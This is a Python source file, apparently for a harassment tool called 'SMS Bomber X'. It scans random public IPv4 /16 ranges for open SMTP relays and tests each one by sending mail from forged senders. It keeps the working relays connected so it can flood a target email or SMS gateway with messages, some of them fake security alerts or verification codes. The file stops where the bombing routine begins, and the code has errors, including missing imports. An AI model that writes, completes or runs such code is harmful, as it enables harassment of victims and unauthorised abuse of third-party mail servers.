#!/usr/bin/env python3
# __________                  __             __     ________             .___ 
# \______   \  ____    ____  |  | __  ____ _/  |_  /  _____/   ____    __| _/ 
#  |       _/ /  _ \ _/ ___\ |  |/ /_/ __ \\   __\/   \  ___  /  _ \  / __ |  
#  |    |   \(  <_> )\  \___ |    < \  ___/ |  |  \    \_\  \(  <_> )/ /_/ |  
#  |____|_  / \____/  \___  >|__|_ \ \___  >|__|   \______  / \____/ \____ |  
#         \/              \/      \/     \/               \/              \/  
#
# SMS Bomber X - Enhanced Edition
# Original by RocketGod, Enhancements inspired by user feedback
# https://github.com/RocketGod-git/smsbomber

# --- Standard Library Imports ---
import logging
import string
import smtplib
import time
import random
import socket
import ipaddress
import re
import concurrent.futures
import textwrap
import os
import json
import itertools
from pathlib import Path
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Any, Tuple, Union # Added Union
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# --- Rich TUI Components ---
# Ensure 'rich' is installed: pip install rich
try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn, TimeRemainingColumn
    from rich.prompt import Prompt, IntPrompt, Confirm, FloatPrompt # Added FloatPrompt
    from rich.table import Table
    from rich.live import Live
    from rich.logging import RichHandler
    from rich import box
except ImportError:
    print("Error: 'rich' library not found. Please install it using: pip install rich")
    exit(1) # Exit if essential TUI library is missing

# --- Configuration ---
CONFIG_DIR = Path.home() / ".smsbomberx"
PROFILES_DIR = CONFIG_DIR / "profiles"
RELAY_CACHE_FILE = CONFIG_DIR / "relay_cache.json"
LOG_FILE = CONFIG_DIR / "smsbomberx.log"
DEFAULT_PORTS = [25, 465, 587]
DEFAULT_TIMEOUT = 10
DEFAULT_SCAN_WORKERS = 100
DEFAULT_RELAY_POOL_TARGET = 5 # Try to find at least this many relays

# --- Ensure Configuration Directories Exist ---
try:
    CONFIG_DIR.mkdir(parents=True, exist_ok=True)
    PROFILES_DIR.mkdir(parents=True, exist_ok=True)
except OSError as e:
    print(f"Error creating configuration directories: {e}")
    # Consider if the script should exit here or try to continue without profile/cache features
    # For now, let's try to continue, logging/saving might fail later.

# --- Setup Logging ---
# File handler (logs more details potentially)
logging.basicConfig(
    level=logging.INFO, # Default level for the file log
    format="%(asctime)s [%(levelname)-7s] %(name)s: %(message)s", # Adjusted format slightly
    handlers=[logging.FileHandler(LOG_FILE, encoding='utf-8')], # Specify encoding
    force=True # Override any root logger configurations
)
# Rich handler for console output (can have a different level)
log = logging.getLogger(__name__) 
log.setLevel(logging.INFO) # Set level for this specific logger (adjust DEBUG, INFO, WARNING)
console = Console(record=True, force_terminal=True, width=120) # Force terminal, record for Live
rich_handler = RichHandler(
    console=console, 
    show_path=False, 
    level=logging.INFO, # Level specifically for console output
    log_time_format="[%X]" # Use shorter time format for console
    ) 
log.addHandler(rich_handler)

# --- Default Messages (if no file specified) ---
# Reduced default list for brevity, keep the existing structure if you have many
DEFAULT_MESSAGES = [
    "Service notification: Please verify your account activity.",
    "Reminder: Your appointment is scheduled soon.",
    "Security Alert: An unusual login attempt was detected.",
    "Promotional Code: Use SAVE10 for your next order.",
    "Did you know? SMS Bomber X provides enhanced features!",
    "System Update: Maintenance scheduled for tonight.",
    "Weather Alert: Severe weather conditions expected.",
    "Stay hydrated! - Your friendly bot",
    "Fact: Open SMTP relays are rare!",
    "Test message initiated by SMS Bomber X.",
    "Configuration update required. Please check settings.",
    "Your verification code is: {random.randint(100000, 999999)}", # Example dynamic message
    "Consider using a VPN for enhanced privacy.",
]

# --- Data Classes ---
@dataclass
class AppConfig:
    """Stores the application configuration."""
    target_email: str = ""
    message_count: int = 10
    delay_min: float = 2.0
    delay_max: float = 5.0
    scan_ports: List[int] = field(default_factory=lambda: list(DEFAULT_PORTS))
    scan_range_raw: str = "" # Raw user input for CIDR/host/IP
    scan_timeout: int = DEFAULT_TIMEOUT
    scan_workers: int = DEFAULT_SCAN_WORKERS
    relay_pool_target: int = DEFAULT_RELAY_POOL_TARGET
    message_file: Optional[str] = None
    use_relay_cache: bool = True
    load_previous_log: bool = True # Refers to open_smtp_servers.log
    profile_name: str = "default"
    
    def get_scan_network(self) -> Optional[Union[ipaddress.IPv4Network, ipaddress.IPv6Network]]:
        """Attempts to parse the raw scan range as an IP network."""
        if not self.scan_range_raw:
            return None
        try:
            # Allow both IPv4 and IPv6 networks
            return ipaddress.ip_network(self.scan_range_raw, strict=False)
        except ValueError:
            # Not a valid CIDR or IP network string
            return None 

    def get_scan_hosts(self) -> List[str]:
        """Returns a list of host IP addresses based on the configured scan range."""
        network = self.get_scan_network()
        if network:
            num_addresses = network.num_addresses
            # Provide warnings but don't prevent scanning unusual ranges
            if not (network.is_global or network.is_private or network.is_loopback):
                log.debug(f"Scan range {network} is neither public, private, nor loopback.")
                
            host_count_for_warning = 65536 # e.g., /16 or larger equivalent in IPv6
            if num_addresses > host_count_for_warning: 
                log.warning(f"Large range specified ({network} contains {num_addresses} addresses). Scanning may take a very long time.")
                # Consider adding interactive confirmation here if needed during runtime

            try:
                # Return list of host IPs within the network
                return [str(ip) for ip in network.hosts()]
            except TypeError:
                 # Handle cases like single-address networks (/32 or /128) where .hosts() might behave differently
                 if num_addresses == 1:
                      return [str(network.network_address)]
                 else:
                      log.warning(f"Could not determine hosts for network {network}, might be too large or misconfigured.")
                      return []

        elif self.scan_range_raw: 
            # If not a network, treat as a single hostname or IP
            log.debug(f"Treating '{self.scan_range_raw}' as a single host target.")
            return [self.scan_range_raw]
        else:
             # No range specified and wasn't a single host entry
             return [] 

    def generate_random_scan_hosts(self) -> List[str]:
        """Generates hosts from a random public /16 IPv4 range."""
        while True:
            # Generate first two octets, excluding private/reserved ranges
            first_octet = random.randint(1, 223) 
            # More specific exclusions
            if first_octet in [10, 127] or \
               (first_octet == 172 and 16 <= random.randint(0, 255) <= 31) or \
               (first_octet == 192 and random.randint(0, 255) == 168) or \
               (first_octet == 169 and random.randint(0, 255) == 254) or \
               (first_octet >= 224): # Exclude multicast too
                   continue
             
            second_octet = random.randint(0, 255)
            random_base = f"{first_octet}.{second_octet}.0.0"
            try:
                ip_net = ipaddress.ip_network(f"{random_base}/16", strict=False)
                # Check it's not any special-use category before proceeding
                if not (ip_net.is_private or ip_net.is_multicast or ip_net.is_reserved or ip_net.is_loopback or ip_net.is_link_local):
                    log.info(f"Generated random scan range: {ip_net}")
                    self.scan_range_raw = str(ip_net) # Update config with the generated range
                    return [str(ip) for ip in ip_net.hosts()]
            except ValueError:
                # Should be rare with generated IPs but handle just in case
                log.debug(f"Generated invalid network base? {random_base}. Retrying.")
                continue # Retry generating

@dataclass
class RelayInfo:
    """Stores information about a potential or confirmed SMTP relay."""
    host: str
    port: int
    status: str = "untested" # e.g., untested, working, failed, auth_required, timeout, refused, tls_failed, proto_error
    last_checked: float = 0.0 # Timestamp of last check
    success_count: int = 0
    failure_count: int = 0
    avg_response_time: Optional[float] = None # Future enhancement: track timing
    # Store the active connection object - marked non-representative and optional
    connection: Optional[Union[smtplib.SMTP, smtplib.SMTP_SSL]] = field(default=None, repr=False) 


# --- Helper Functions ---
def validate_email(email: str) -> bool:
    """Basic validation of email address format using regex."""
    if not email: return False
    # Simple regex, not fully RFC compliant but covers most common cases
    email_regex = r"^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]{2,}$"
    return re.match(email_regex, email) is not None

def random_string(length: int = 10) -> str:
    """Generates a random string of lowercase letters."""
    if length < 1: length = 1
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))

def load_messages(filepath: Optional[str]) -> List[str]:
    """Loads messages from a specified file or returns default messages."""
    messages_to_load = []
    source = "defaults"
    if filepath:
        message_path = Path(filepath)
        if message_path.is_file():
            try:
                with open(message_path, 'r', encoding='utf-8') as f:
                    messages_to_load = [line.strip() for line in f if line.strip()]
                if messages_to_load:
                    log.info(f"Loaded {len(messages_to_load)} messages from '{filepath}'")
                    source = filepath
                else:
                    log.warning(f"Message file '{filepath}' was empty. Using default messages.")
            except IOError as e:
                log.error(f"Error reading message file '{filepath}': {e}. Using default messages.")
            except Exception as e: # Catch other potential errors like decoding issues
                log.error(f"Unexpected error reading message file '{filepath}': {e}. Using default messages.")
        else:
             log.error(f"Message file '{filepath}' not found. Using default messages.")
    
    if not messages_to_load: # If file failed or wasn't specified
        log.info("Using default messages.")
        messages_to_load = DEFAULT_MESSAGES
        source = "defaults"

    # Simple dynamic message replacement (example)
    final_messages = []
    for msg in messages_to_load:
         try:
             final_messages.append(msg.format(random=random)) # Allow basic formatting like {random.randint(..)}
         except Exception as fmt_err:
             log.debug(f"Could not format message: '{msg}'. Error: {fmt_err}. Using literal message.")
             final_messages.append(msg) # Use the original string if formatting fails

    return final_messages

def parse_ports(port_str: str) -> List[int]:
    """Parses a comma-separated string of ports into a list of valid integers."""
    ports = set() # Use a set to automatically handle duplicates
    try:
        parts = port_str.split(',')
        for part in parts:
            part = part.strip()
            if not part: continue
            port_num = int(part)
            if 1 <= port_num <= 65535:
                ports.add(port_num)
            else:
                log.warning(f"Ignoring invalid port number: {port_num}")
        
        valid_ports = sorted(list(ports))
        if valid_ports:
            log.debug(f"Parsed ports: {valid_ports}")
            return valid_ports
        else:
             log.warning(f"No valid ports found in '{port_str}'. Using default ports: {DEFAULT_PORTS}")
             return list(DEFAULT_PORTS) # Return a copy
             
    except ValueError:
        log.error(f"Invalid characters in port string: '{port_str}'. Using default ports: {DEFAULT_PORTS}")
        return list(DEFAULT_PORTS) # Return a copy


# --- Relay Management ---
class RelayManager:
    """Manages the collection, caching, and status of potential SMTP relays."""
    def __init__(self, cache_file: Path, console: Console):
        self.cache_file = cache_file
        self.console = console
        # Known relays stored by (host, port) tuple for quick lookup
        self.known_relays: Dict[Tuple[str, int], RelayInfo] = {} 
        # List of relays currently considered active and having a connection
        self.active_relays: List[RelayInfo] = []
        # Iterator for round-robin cycling through active relays
        self._active_relay_cycler: Optional[itertools.cycle] = None
        self.load_cache() # Load existing cache on initialization

    def load_cache(self):
        """Loads relay information from the JSON cache file."""
        if self.cache_file.is_file(): # Use is_file() for Path object
            try:
                with open(self.cache_file, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                loaded_count = 0
                for key_str, relay_dict in data.items():
                    try:
                        # Robust parsing of key
                        if ':' not in key_str: continue # Skip invalid keys
                        host, port_str = key_str.rsplit(':', 1) # Use rsplit for IPv6 addresses
                        port = int(port_str)
                        
                        # Ensure dict contains valid keys for RelayInfo before attempting creation
                        valid_keys = RelayInfo.__annotations__.keys()
                        relay_info_data = {k: v for k, v in relay_dict.items() 
                                           if k in valid_keys and k != 'connection'} # Exclude connection explicitly
                        
                        # Only add if essential fields are present
                        if 'host' in relay_info_data and 'port' in relay_info_data:
                           relay = RelayInfo(**relay_info_data) 
                           self.known_relays[(relay.host, relay.port)] = relay
                           loaded_count += 1
                        else:
                            log.warning(f"Skipping cache entry {key_str}: Missing essential fields.")
                             
                    except (ValueError, TypeError, KeyError) as e:
                        log.warning(f"Skipping invalid entry in cache '{key_str}': {e}")
                log.info(f"Loaded {loaded_count} relays from cache: {self.cache_file}")
            except (json.JSONDecodeError, IOError) as e:
                log.error(f"Failed to load or parse relay cache '{self.cache_file}': {e}")
            except Exception as e:
                 log.error(f"Unexpected error loading relay cache: {e}", exc_info=True)
        else:
            log.info(f"Relay cache file not found: '{self.cache_file}'. Starting fresh.")
            
    def save_cache(self):
        """Saves the current state of known relays to the JSON cache file."""
        log.debug(f"Attempting to save {len(self.known_relays)} relays to cache...")
        data_to_save = {}
        for (host, port), relay_info in self.known_relays.items():
             # Create a dictionary representation, excluding the non-serializable 'connection'
             relay_dict = relay_info.__dict__.copy()
             relay_dict.pop('connection', None) 
             # Ensure last_checked is float (it should be, but safety)
             relay_dict['last_checked'] = float(relay_info.last_checked)
             data_to_save[f"{host}:{port}"] = relay_dict
             
        try:
            # Ensure parent directory exists before writing
            self.cache_file.parent.mkdir(parents=True, exist_ok=True)
            with open(self.cache_file, 'w', encoding='utf-8') as f:
                json.dump(data_to_save, f, indent=2, ensure_ascii=False)
            log.info(f"Relay cache saved successfully to {self.cache_file}")
        except (IOError, TypeError) as e:
            log.error(f"Failed to save relay cache '{self.cache_file}': {e}")
        except Exception as e:
             log.error(f"Unexpected error saving relay cache: {e}", exc_info=True)

    def add_or_update_relay(self, host: str, port: int, status: str, connection: Optional[Union[smtplib.SMTP, smtplib.SMTP_SSL]] = None):
        """Adds a new relay or updates the status of an existing one."""
        key = (host, port)
        now = time.time()
        is_working = (status == 'working')

        if key in self.known_relays:
            # Update existing relay
            relay = self.known_relays[key]
            relay.status = status
            relay.last_checked = now
            if is_working:
                relay.success_count += 1
                relay.failure_count = 0 # Reset failure count on success
                if connection and not relay.connection: # Only update connection if needed
                    relay.connection = connection
                    if relay not in self.active_relays: # Add to active if not already there
                        self.active_relays.append(relay)
                        log.debug(f"Reactivated relay {host}:{port} in active pool.")
            else:
                relay.failure_count += 1
                # If it failed, ensure connection is closed and removed from active pool
                if relay in self.active_relays:
                    if relay.connection:
                        try: relay.connection.quit() 
                        except: pass # Ignore errors on quit
                    relay.connection = None
                    try:
                         self.active_relays.remove(relay)
                         log.debug(f"Removed failed/inactive relay {host}:{port} from active pool.")
                    except ValueError:
                         pass # Already removed, potentially by another thread/check
        else:
            # Add new relay
            relay = RelayInfo(host=host, port=port, status=status, last_checked=now)
            if is_working:
                relay.success_count = 1
                if connection:
                    relay.connection = connection
                    self.active_relays.append(relay)
                    log.debug(f"Added NEW working relay {host}:{port} to active pool.")
            else:
                relay.failure_count = 1
            self.known_relays[key] = relay # Add to the main dictionary
            
        # Reset the cycler whenever the active pool might have changed
        if self.active_relays:
            self._active_relay_cycler = itertools.cycle(self.active_relays)
        else:
             self._active_relay_cycler = None

    def get_scan_targets(self, config: AppConfig, previous_log_ips: List[str]) -> List[Dict[str, Any]]:
        """Prepares the list of target dictionaries ({'host', 'port', 'source'}) for scanning."""
        targets: List[Dict[str, Any]] = []
        # Use a set to efficiently track hosts/ports already added
        processed: Set[Tuple[str, int]] = set() 

        # 1. Prioritize relays from the cache based on past success/recency
        if config.use_relay_cache:
            # Sort criteria: working first, then by success count (desc), failure count (asc), last checked (desc)
            sorted_cached_relays = sorted(
                self.known_relays.values(), 
                key=lambda r: (
                    r.status == 'working', # True comes before False
                    r.success_count, 
                    -r.failure_count, # Negate to sort ascending failures
                    r.last_checked 
                ),
                reverse=True # Sort descending by primary criteria
            )
            for relay in sorted_cached_relays:
                key = (relay.host, relay.port)
                if key not in processed:
                    targets.append({'host': relay.host, 'port': relay.port, 'source': 'cache'})
                    processed.add(key)
            log.debug(f"Added {len(targets)} targets from cache.")

        # 2. Add relays from the legacy log file if enabled
        if config.load_previous_log and previous_log_ips:
            log_targets_added = 0
            for item in previous_log_ips:
                try:
                    # Handle potential format variations, use rsplit for IPv6 safety
                    if ':' not in item: continue 
                    host, port_str = item.rsplit(':', 1)
                    port = int(port_str)
                    key = (host, port)
                    if key not in processed:
                        targets.append({'host': host, 'port': port, 'source': 'log'})
                        processed.add(key)
                        log_targets_added += 1
                except (ValueError, IndexError):
                    log.warning(f"Skipping invalid entry from previous log: '{item}'")
            log.debug(f"Added {log_targets_added} targets from legacy log.")
            
        # 3. Add targets from the user-specified range/host or generated random range
        range_targets_added = 0
        # Ensure base_hosts gets generated only if scan_range_raw is empty initially
        if not config.scan_range_raw and not config.get_scan_hosts():
             base_hosts = config.generate_random_scan_hosts()
             log.info(f"Generated {len(base_hosts)} hosts from random range {config.scan_range_raw}")
        else:
             base_hosts = config.get_scan_hosts()

        if base_hosts:
            for host in base_hosts:
                for port in config.scan_ports:
                    key = (host, port)
                    if key not in processed:
                        targets.append({'host': host, 'port': port, 'source': 'scan_range'})
                        processed.add(key)
                        range_targets_added += 1
        log.debug(f"Added {range_targets_added} targets from configured scan range/host.")

        log.info(f"Prepared a total of {len(targets)} unique targets for scanning.")
        return targets

    def get_next_active_relay(self) -> Optional[RelayInfo]:
        """Cycles through the active relay list and returns the next available one."""
        if not self.active_relays:
            log.debug("Relay pool is empty.")
            return None
            
        if self._active_relay_cycler is None:
            log.debug("Initializing active relay cycler.")
            self._active_relay_cycler = itertools.cycle(self.active_relays)
        
        # Try getting the next relay, handle potential issues
        start_index = -1 # To detect if we've looped fully
        try:
            # Get the list we're currently cycling over (important if it changes)
            current_cycle_list = list(self._active_relay_cycler.__self__) # Access underlying sequence if possible (might be implementation specific)
            if not current_cycle_list: current_cycle_list = self.active_relays # Fallback
            
            # Iterate through the cycle, but max attempts = current pool size to prevent infinite loops
            for attempt in range(len(current_cycle_list) + 1): # +1 just in case
                relay = next(self._active_relay_cycler)
                
                # Basic checks before returning: Is it still considered active? Does it have a connection?
                if relay in self.active_relays and relay.connection:
                    log.debug(f"Returning next active relay: {relay.host}:{relay.port}")
                    # Optional: Perform NOOP check here for connection validity - adds overhead
                    # try:
                    #    relay.connection.noop()
                    # except (smtplib.SMTPServerDisconnected, smtplib.SMTPException):
                    #    log.warning(f"Relay {relay.host}:{relay.port} failed NOOP check. Marking failed.")
                    #    self.mark_relay_failed(relay, "noop_failed")
                    #    continue # Try the next one in the cycle
                    return relay
                else:
                    log.debug(f"Skipping relay {relay.host}:{relay.port} as it's no longer active or lacks connection.")
                    # It might have been removed by another thread, let the cycle continue
            
            # If we exhausted the attempts without finding a valid one
            log.warning("Cycled through all potential relays without finding an active one.")
            return None
            
        except StopIteration:
            log.debug("Relay cycler unexpectedly exhausted.")
            self._active_relay_cycler = itertools.cycle(self.active_relays) if self.active_relays else None
            return None # No active relays left
        except AttributeError: # If __self__ isn't available on the cycle object
            log.warning("Could not determine cycle length reliably. Falling back to basic cycle.")
            # Less safe loop detection, relies only on StopIteration
            try:
                return next(self._active_relay_cycler)
            except StopIteration:
                return None
        except Exception as e:
            log.error(f"Unexpected error getting next relay: {e}", exc_info=True)
            # Attempt to reset the cycle
            self._active_relay_cycler = itertools.cycle(self.active_relays) if self.active_relays else None
            return None


    def mark_relay_failed(self, relay_info: RelayInfo, reason: str = "send_error"):
        """Marks a specific relay as failed, providing a reason."""
        if relay_info:
             log.warning(f"Marking relay {relay_info.host}:{relay_info.port} as failed. Reason: {reason}.")
             # Update status, which handles closing connection & removing from active pool
             self.add_or_update_relay(relay_info.host, relay_info.port, reason) 
        else:
             log.error("Attempted to mark a None relay as failed.")

    def close_all_connections(self):
        """Attempts to cleanly quit all active SMTP connections."""
        if not self.active_relays:
            log.info("No active relay connections to close.")
            return
            
        log.info(f"Attempting to close {len(self.active_relays)} active relay connections...")
        # Iterate over a copy of the list as closing might modify the original
        active_copy = list(self.active_relays) 
        closed_count = 0
        for relay in active_copy:
            if relay.connection:
                log.debug(f"Closing connection to {relay.host}:{relay.port}...")
                try:
                    # Use quit() for graceful closure
                    relay.connection.quit()
                    closed_count += 1
                except (smtplib.SMTPServerDisconnected, smtplib.SMTPException, socket.error):
                    # Ignore errors during quit, connection might already be dead
                    log.debug(f"Error ignored during quit for {relay.host}:{relay.port} (likely already closed).")
                    pass 
                except Exception as e:
                    # Log unexpected errors during quit
                    log.warning(f"Unexpected error quitting {relay.host}:{relay.port}: {e}")
                finally:
                     # Ensure connection attribute is cleared regardless of quit success/failure
                     relay.connection = None 
                     # Ensure it's removed from the active list if marking failed didn't catch it
                     if relay in self.active_relays:
                           try: self.active_relays.remove(relay)
                           except ValueError: pass # Already gone
        
        self.active_relays.clear() # Explicitly clear the list after processing copy
        self._active_relay_cycler = None # Reset the cycler
        log.info(f"Finished closing connections. {closed_count} closed gracefully (or attempted).")


# --- Scanning Logic ---
def test_single_relay(target: Dict[str, Any], timeout: int) -> Tuple[Dict[str, Any], Optional[Union[smtplib.SMTP, smtplib.SMTP_SSL]], str]:
    """
    Tests a single host:port combination for open SMTP relay capability.
    Returns the original target dict, the smtplib server object (if successful), and a status string.
    """
    hostname = target['host']
    port = target['port']
    server: Optional[Union[smtplib.SMTP, smtplib.SMTP_SSL]] = None
    status: str = "failed" # Default status if tests don't complete successfully

    try:
        log.debug(f"Testing relay target: {hostname}:{port}")
        # Use unique enough sender/receiver for testing without easily triggering basic filters
        sender_local = random_string(8)
        sender_domain = f"{random_string(6)}.test" # Using .test TLD is safer
        sender = f"{sender_local}@{sender_domain}" 
        receiver = f"test-recipient-{random.randint(1000,9999)}@example.com" # example.com is standard for testing
        
        start_time = time.monotonic() # For potential future timing metrics
        
        # --- Step 1: Establish Connection (handling different port conventions) ---
        if port == 465:
            # Port 465 typically uses Implicit SSL/TLS from the start
            log.debug(f"Connecting via SMTP_SSL to {hostname}:{port} (Timeout: {timeout}s)")
            server = smtplib.SMTP_SSL(hostname, port, timeout=timeout)
            # Send EHLO after connection established
            server.ehlo(sender_domain) # Use domain for ehlo
        else:
            # Ports 25, 587 typically start plain, then may use STARTTLS
            log.debug(f"Connecting via SMTP to {hostname}:{port} (Timeout: {timeout}s)")
            server = smtplib.SMTP(hostname, port, timeout=timeout)
            server.ehlo(sender_domain) # Initial EHLO
            if port == 587: 
                # Port 587 (Submission) usually requires STARTTLS
                log.debug(f"Attempting STARTTLS on {hostname}:{port}...")
                try:
                    if server.has_extn('starttls'):
                        server.starttls()
                        # Re-issue EHLO after successful STARTTLS
                        server.ehlo(sender_domain) 
                        log.debug(f"STARTTLS successful on {hostname}:{port}")
                    else:
                         log.warning(f"Server {hostname}:{port} does not support STARTTLS, though on port 587.")
                         # Decide if this constitutes failure - arguably yes for port 587
                         status = "starttls_unsupported"
                         # Try graceful quit before returning
                         try: server.quit()
                         except: pass 
                         return target, None, status
                except smtplib.SMTPException as tls_error:
                    log.warning(f"STARTTLS failed on {hostname}:{port}: {tls_error}")
                    status = "starttls_failed"
                    # Try graceful quit before returning
                    try: server.quit() 
                    except: pass
                    return target, None, status # Return early if STARTTLS fails on 587

        # --- Step 2: Prepare and Send Test Message to check Relay ---
        msg = MIMEMultipart('alternative')
        msg['From'] = sender
        msg['To'] = receiver
        msg['Subject'] = f'Connectivity Test {random_string(5)}' # Less suspicious subject
        msg['Date'] = smtplib.email.utils.formatdate(localtime=True) # Add Date header
        # Use a unique Message-ID to potentially avoid trivial duplicate rejection
        msg['Message-ID'] = smtplib.make_msgid(domain=sender_domain) 
        # Simple plain text body
        msg_body = f"Relay test initiated {time.time()} from host."
        msg.attach(MIMEText(msg_body, 'plain', 'utf-8')) # Ensure UTF-8
        
        log.debug(f"Attempting relay test send: {sender} -> {receiver} via {hostname}:{port}")
        
        # The core test: Can we send from our fake sender to fake receiver?
        server.sendmail(sender, receiver, msg.as_string())
        
        # --- Step 3: Success ---
        # If sendmail did not raise an exception, assume relaying worked
        end_time = time.monotonic()
        response_time = end_time - start_time
        log.info(f"[bold green]SUCCESS[/]: Open relay confirmed at {hostname}:{port} (Time: {response_time:.2f}s)")
        status = "working"
        # Keep the connection object open and return it
        return target, server, status

    # --- Error Handling during connection or sending ---
    except smtplib.SMTPAuthenticationError:
        log.info(f"{hostname}:{port} requires authentication. Not an open relay.")
        status = "auth_required"
    except smtplib.SMTPRecipientsRefused as e:
        # This is expected if it's NOT an open relay
        log.debug(f"Recipient '{receiver}' refused by {hostname}:{port}. Not an open relay. ({e})")
        status = "recipient_refused" 
    except smtplib.SMTPSenderRefused as e:
        log.debug(f"Sender '{sender}' refused by {hostname}:{port}. Likely not an open relay or anti-spam. ({e})")
        status = "sender_refused"
    except smtplib.SMTPHeloError as e:
        log.warning(f"HELO/EHLO error with {hostname}:{port}: {e}")
        status = "proto_error_helo"
    except smtplib.SMTPDataError as e:
        # Errors after sending DATA command
        log.warning(f"SMTP data error during test send for {hostname}:{port}: {e}")
        status = "proto_error_data"
    except smtplib.SMTPConnectError as e:
        # Specific error for connection failure reported by smtplib
        log.debug(f"SMTP library reported connection error for {hostname}:{port}: {e}")
        status = "connect_failed_smtp"
    except smtplib.SMTPNotSupportedError as e:
        # E.g., STARTTLS called when not supported
        log.warning(f"SMTP feature not supported by {hostname}:{port}: {e}")
        status = "feature_unsupported"
    except smtplib.SMTPResponseException as e:
        # Catch other general SMTP protocol errors with status codes
        log.warning(f"Unexpected SMTP response from {hostname}:{port}: {e.smtp_code} {e.smtp_error}")
        status = f"smtp_error_{e.smtp_code}" # Include code in status if possible
    except smtplib.SMTPException as e:
        # Catch-all for other smtplib-specific exceptions
        log.warning(f"General SMTP exception with {hostname}:{port}: {e}")
        status = "smtp_error_general"
    except socket.timeout:
        log.debug(f"Connection timed out for {hostname}:{port}")
        status = "timeout"
    except socket.gaierror as e:
        # DNS resolution errors
        log.debug(f"DNS lookup error for hostname '{hostname}': {e}")
        status = "dns_error"
    except (socket.error, OSError) as e: 
        # Lower-level socket errors (e.g., Connection refused, Network unreachable)
        log.debug(f"Socket/OS error connecting to {hostname}:{port}: {e}")
        status = "socket_error"
    except Exception as e:
        # Catch any other unexpected Python errors during the process
        log.error(f"Unexpected Python error during test of {hostname}:{port}: {e}", exc_info=True) # Log full traceback
        status = "unknown_error"
        
    # --- Cleanup: Ensure connection is closed if an error occurred ---
    if server:
        try:
            # Try to gracefully quit the connection
            server.quit()
        except: 
            # Ignore any errors during cleanup quit (connection might be dead)
            pass
            
    # Return the target info, None for connection object, and the determined status string
    return target, None, status

def run_scan(config: AppConfig, relay_manager: RelayManager, previous_log_ips: List[str], progress: Progress) -> None:
    """Manages the parallel scanning of potential relays using ThreadPoolExecutor."""
    
    # Prepare the list of targets to check, including prioritizing from cache/log
    scan_targets = relay_manager.get_scan_targets(config, previous_log_ips)
    if not scan_targets:
        log.warning("Scan initiated, but no targets were identified (check range, cache, log settings).")
        # Add a dummy task to show completion immediately if desired, or just return
        # progress.add_task("[yellow]Scan Skipped", total=1, completed=1) 
        return

    # --- Setup Progress Bar Task for Scanning ---
    task_scan_id = progress.add_task("[cyan]Scanning Relays", total=len(scan_targets), start=True)
    found_count = 0
    tested_count = 0
    
    # Determine max workers, ensuring it's at least 1
    max_workers = min(config.scan_workers, len(scan_targets))
    if max_workers <= 0: max_workers = 1 
    log.info(f"Starting relay scan with up to {max_workers} concurrent workers.")

    # Keep track of submitted futures
    futures: Set[concurrent.futures.Future] = set()
    scan_stopped_early = False

    try:
        # --- Execute Tests in Parallel ---
        with ThreadPoolExecutor(max_workers=max_workers, thread_name_prefix="Scanner_") as executor:
            # Submit initial batch of tasks
            for target in scan_targets:
                # Check if we've already found enough relays before submitting more
                if len(relay_manager.active_relays) >= config.relay_pool_target:
                    log.info(f"Relay pool target ({config.relay_pool_target}) reached. Halting submission of new scan tasks.")
                    scan_stopped_early = True
                    break # Stop submitting new jobs
                    
                future = executor.submit(test_single_relay, target, config.scan_timeout)
                futures.add(future)

            # --- Process Completed Futures ---
            log.debug(f"Submitted {len(futures)} initial scan tasks. Waiting for results...")
            for future in concurrent.futures.as_completed(futures):
                tested_count += 1
                
                if progress.tasks[task_scan_id].finished: # Check if task was marked finished early
                      log.debug("Scan task finished, skipping result processing.")
                      continue
                      
                try:
                    # Retrieve the result from the completed future
                    target_back, connection, status = future.result()
                    
                    # Update the RelayManager with the result (this handles adding to active pool if successful)
                    relay_manager.add_or_update_relay(target_back['host'], target_back['port'], status, connection)
                    
                    if status == "working":
                        found_count += 1
                        log.debug(f"Found relay #{found_count} at {target_back['host']}:{target_back['port']}")
                        # Update progress description with the count of found relays
                        progress.update(task_scan_id, advance=1, description=f"[cyan]Scanning Relays ({found_count} Found)")
                        
                        # Check if the pool target is met *after processing this result*
                        if not scan_stopped_early and len(relay_manager.active_relays) >= config.relay_pool_target:
                            log.info(f"Relay pool target ({config.relay_pool_target}) reached after processing result. Scan will finish soon.")
                            scan_stopped_early = True 
                            # Optional: Aggressively cancel remaining tasks
                            # log.debug("Attempting to cancel remaining scan tasks...")
                            # for f in futures: f.cancel() # Note: cancel() doesn't always work if task is running
                            # executor.shutdown(wait=False, cancel_futures=True) # More forceful shutdown

                    else:
                        # Log failed tests at debug level to avoid console flooding
                        log.debug(f"Test failed for {target_back['host']}:{target_back['port']} with status: {status}")
                        progress.update(task_scan_id, advance=1)
                        
                except concurrent.futures.CancelledError:
                      log.debug("A scan task was cancelled.")
                      progress.update(task_scan_id, advance=1) # Still advance progress
                except Exception as exc:
                    # Catch errors *during future result processing itself*, not errors within test_single_relay
                    log.error(f'Error processing a scan result: {exc}', exc_info=True)
                    progress.update(task_scan_id, advance=1) # Ensure progress advances even on error

    except KeyboardInterrupt:
        log.warning("Scan interrupted by user (KeyboardInterrupt).")
        progress.stop() # Stop the progress display cleanly
        # Cancel remaining futures if possible? This might be handled by executor shutdown
        # executor.shutdown(wait=False, cancel_futures=True) # Consider adding if needed
        raise # Re-raise KeyboardInterrupt to be caught by the main application loop
    except Exception as e:
        log.critical(f"Critical error occurred during scan execution: {e}", exc_info=True)
        progress.stop() # Ensure progress stops on critical errors

    finally:
        log.debug("Scan execution block finished.")
        # Ensure the progress task is appropriately marked as finished
        if not progress.tasks[task_scan_id].finished:
            final_desc = f"[cyan]Scan Completed ({len(relay_manager.active_relays)} Relays Found)"
            if scan_stopped_early:
                 final_desc = f"[yellow]Scan Halted ({len(relay_manager.active_relays)} Relays Found - Target Met)"
            # Ensure completed count matches total for the progress bar to look right
            progress.update(task_scan_id, completed=len(scan_targets), description=final_desc)
            
    log.info(f"Relay scan phase complete. Found {len(relay_manager.active_relays)} working relays.")
    # Save the cache after the scan finishes (or is interrupted)
    relay_manager.save_cache()


# --- Bombing Logic ---
def run_bombing(config: AppConfig, relay_manager: RelayManager, progress: Progress) -> None:
    """Manages the process of sending messages using the discovered active relays."""
    
    # Pre-check: Ensure we have relays to work with
    if not relay_manager.active_relays:
